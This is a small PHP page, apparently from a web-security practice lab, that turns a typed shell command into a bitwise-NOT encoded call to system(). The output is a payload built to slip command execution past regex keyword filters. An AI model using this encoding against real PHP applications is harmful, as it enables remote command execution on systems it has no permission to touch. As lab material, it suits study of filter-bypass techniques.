<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>正则绕过取反练习</title>
</head>
<body>
<center>
	<?php include('../session.php');
		echo "<br/><br/><br/><br/><br/><br/>";
		echo "执行的命令如：dir";
		echo "<form action='#' method='post'>";
		echo "<input type='text' name='code'>";
		echo "<input type='submit' name='submit' value='取反'>";
		echo "</form>";
		
		if(isset($_POST['code']) && !empty($_POST['code'])){
			$code = $_POST['code'];
			# echo $rcetext;
			echo "("."~".urlencode(~"system").")"."("."~".urlencode(~$code).")".";";
		}
	?>
</center>
</body>